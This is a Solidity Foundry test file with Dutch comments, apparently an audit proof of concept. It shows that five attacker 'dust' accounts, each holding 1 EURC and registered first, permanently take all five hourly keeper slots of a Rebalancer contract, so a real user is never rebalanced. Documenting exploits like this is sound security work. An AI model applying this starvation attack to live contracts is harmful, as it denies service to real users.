// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Rebalancer} from "../src/Rebalancer.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockAggregator} from "./mocks/MockAggregator.sol";
import {MockRouter} from "./mocks/MockRouter.sol";
import {MockUniswapV3Pool} from "./mocks/MockUniswapV3Pool.sol";

/// PoC: 5 stof-owners die vóór de echte gebruiker registreren, bezetten elk uur alle 5 CRE-slots.
contract PocStarvation is Test {
    uint256 constant START = 1_800_000_000;
    uint256 constant PRICE = 80_000e6;
    MockERC20 eurc; MockERC20 cbbtc; MockERC20 usdc;
    MockAggregator feedBtc; MockAggregator feedEurc; MockAggregator seq;
    MockRouter router; MockUniswapV3Pool p1; MockUniswapV3Pool p2;
    Rebalancer r;
    address treasury = makeAddr("treasury");
    address forwarder = makeAddr("forwarder");
    address wfOwner = makeAddr("wfOwner");
    address alice = makeAddr("alice");

    function setUp() public {
        vm.warp(START);
        vm.etch(forwarder, hex"5f");
        eurc = new MockERC20("EURC", "EURC", 6);
        cbbtc = new MockERC20("cbBTC", "cbBTC", 8);
        usdc = new MockERC20("USDC", "USDC", 6);
        feedBtc = new MockAggregator(8, "b"); feedEurc = new MockAggregator(8, "e"); seq = new MockAggregator(0, "s");
        p1 = new MockUniswapV3Pool(address(eurc), address(usdc));
        p2 = new MockUniswapV3Pool(address(usdc), address(cbbtc));
        _price();
        seq.set(0, START - 1 days, START - 1 days);
        router = new MockRouter(address(eurc), address(usdc), address(cbbtc), PRICE);
        r = new Rebalancer(Rebalancer.Deployment({
            eurc: address(eurc), cbbtc: address(cbbtc), usdc: address(usdc), router: address(router),
            feedCbbtcUsd: address(feedBtc), feedEurcUsd: address(feedEurc), sequencerFeed: address(seq),
            poolEurcUsdc: address(p1), poolUsdcCbbtc: address(p2), treasury: treasury, forwarder: forwarder,
            workflowOwner: wfOwner
        }));
    }

    function _price() internal {
        uint256 ts = vm.getBlockTimestamp();
        feedBtc.set(int256(PRICE * 1e8 / 1e6), ts, ts);
        feedEurc.set(1e8, ts, ts);
        p1.setPrice(1e6, 1e6);
        p2.setPrice(PRICE, 1e8);
    }

    function _dustParams() internal pure returns (Rebalancer.Params memory) {
        return Rebalancer.Params({active: true, targetBps: 8000, bandBps: 1, maxCorrectionBps: 1, minTradeEurc: 1, interval: 1 hours, maxSlippageBps: 100});
    }

    function _realParams() internal pure returns (Rebalancer.Params memory) {
        return Rebalancer.Params({active: true, targetBps: 8000, bandBps: 500, maxCorrectionBps: 1000, minTradeEurc: 5e6, interval: 1 hours, maxSlippageBps: 100});
    }

    /// Nabootsing van cre/bitburo-keeper/main.ts: eerste 5 due owners in registratievolgorde.
    function _creReport() internal view returns (address[] memory list) {
        uint256 count = r.ownerCount();
        address[] memory tmp = new address[](5);
        uint256 n;
        for (uint256 off = 0; off < count && n < 5; off += 50) {
            address[] memory page = r.dueOwners(off, 50);
            for (uint256 i = 0; i < page.length && n < 5; i++) tmp[n++] = page[i];
        }
        list = new address[](n);
        for (uint256 i = 0; i < n; i++) list[i] = tmp[i];
    }

    function test_poc_dustOwnersStarveRealUserForever() public {
        // Aanvaller: 5 adressen, elk 1 EURC (1e6), stof-params. Kosten: 5x setParams + 5x approve.
        address[5] memory dust;
        for (uint256 i = 0; i < 5; i++) {
            dust[i] = makeAddr(string(abi.encodePacked("dust", i)));
            eurc.mint(dust[i], 1e6);
            vm.startPrank(dust[i]);
            eurc.approve(address(r), type(uint256).max);
            r.setParams(_dustParams());
            vm.stopPrank();
        }
        // Echte gebruiker registreert daarna met 1.000 EURC en is elk uur due (cap 10%).
        eurc.mint(alice, 1000e6);
        vm.startPrank(alice);
        eurc.approve(address(r), type(uint256).max);
        cbbtc.approve(address(r), type(uint256).max);
        r.setParams(_realParams());
        vm.stopPrank();

        (bool due, int256 delta) = r.isDue(dust[0]);
        assertTrue(due);
        console.log("stof-owner due, correctie in EURC-basiseenheden:", uint256(delta)); // 100 = 0,0001 EURC

        uint256 aliceServed;
        for (uint256 hour = 0; hour < 48; hour++) {
            address[] memory list = _creReport();
            if (hour < 3 || hour == 47) console.log("uur", hour, "now", vm.getBlockTimestamp());
            if (hour < 3 || hour == 47) console.log("  due in rapport:", list.length, "dust0 last", r.lastExecutedAt(dust[0]));
            if (list.length != 5) {
                (bool d0, int256 dl) = r.isDue(dust[0]);
                console.log("dust0 due", d0, "delta", uint256(dl));
                console.log("dust0 bal", eurc.balanceOf(dust[0]), "last", r.lastExecutedAt(dust[0]));
                console.log("now", block.timestamp, "btc", cbbtc.balanceOf(dust[0]));
                (bool ok, uint256 q) = (true, r.quoteChecked()); console.log("quote", q, ok);
            }
            assertEq(list.length, 5);
            for (uint256 i = 0; i < 5; i++) assertEq(list[i], dust[i], "slot bezet door stof-owner");
            vm.prank(forwarder);
            r.onReport{gas: 4_000_000}(abi.encodePacked(bytes32(uint256(1)), bytes10("bitburo"), wfOwner, bytes2(0x0001)), abi.encode(list));
            if (r.lastExecutedAt(alice) != 0) aliceServed++;
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            _price();
        }
        assertEq(aliceServed, 0, "alice is in 48 uur nooit door de CRE-wekker bediend");
        (due,) = r.isDue(alice);
        assertTrue(due);
        console.log("stof-owner saldo na 48 runs:", eurc.balanceOf(dust[0]), "(van 1.000.000)");
        console.log("treasury-fee na 240 stof-runs:", eurc.balanceOf(treasury));
    }
}
